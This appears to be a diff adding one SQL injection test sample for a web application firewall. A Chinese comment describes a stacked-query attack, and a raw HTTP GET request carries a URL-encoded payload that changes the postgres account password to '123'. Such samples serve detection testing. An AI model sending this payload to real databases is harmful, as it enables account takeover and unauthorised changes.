@@ -1,0 +1,9 @@
+# SQL注入_GET_postgresql _普通注入-06506344
+# 攻击者基于堆叠查询，将"alter user postgres with password '123'"语句注入到 SQL 查询参数中，修改postgre账户的密码。
+GET /?id=1%3Balter%20user%20postgres%20with%20password%20%27123%27&bid=hd_tag_m8mv23z4 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23z4
+RM-PRO-Token: 216fac7e3ea4660e83a08847195661f5
+RM-PRO-Time: 1742808354813
+User-Agent: curl/7.83.1
+
